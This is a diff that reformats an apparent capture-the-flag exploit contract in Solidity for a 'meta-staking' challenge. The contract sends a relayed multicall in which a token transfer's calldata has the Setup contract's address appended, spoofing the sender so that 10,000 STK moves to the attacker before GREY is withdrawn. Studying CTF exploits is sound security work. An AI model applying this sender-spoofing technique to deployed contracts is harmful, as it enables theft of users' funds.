@@ -1,8 +1,8 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity 0.8.15;
 
-import { Setup, Staking, Relayer } from "src/meta-staking/Setup.sol";
-import { Batch } from "src/meta-staking/lib/Batch.sol";
+import {Setup, Staking, Relayer} from "src/meta-staking/Setup.sol";
+import {Batch} from "src/meta-staking/lib/Batch.sol";
 
 contract Exploit {
     Setup setup;
@@ -17,16 +17,9 @@ contract Exploit {
 
     function solve(uint8 v, bytes32 r, bytes32 s) external {
         // Transfer 10,000 STK to this address
-        Relayer.Signature memory signature = Relayer.Signature({
-            v: v,
-            r: r,
-            s: s,
-            deadline: type(uint256).max
-        });
-        Relayer.TransactionRequest memory request = Relayer.TransactionRequest({
-            transaction: _getTransaction(),
-            signature: signature
-        });
+        Relayer.Signature memory signature = Relayer.Signature({v: v, r: r, s: s, deadline: type(uint256).max});
+        Relayer.TransactionRequest memory request =
+            Relayer.TransactionRequest({transaction: _getTransaction(), signature: signature});
         setup.relayer().execute(request);
 
         // Withdraw GREY with STK and transfer to msg.sender
@@ -41,10 +34,7 @@ contract Exploit {
     function _getTransaction() internal view returns (Relayer.Transaction memory) {
         // Create transaction to transfer 10,000 STK from Setup contract to this address
         bytes[] memory innerData = new bytes[](1);
-        innerData[0] = abi.encodePacked(
-            abi.encodeCall(Staking.transfer, (address(this), 10_000e18)),
-            address(setup)
-        );
+        innerData[0] = abi.encodePacked(abi.encodeCall(Staking.transfer, (address(this), 10_000e18)), address(setup));
 
         // Pass data to multicall through relayer
         return Relayer.Transaction({
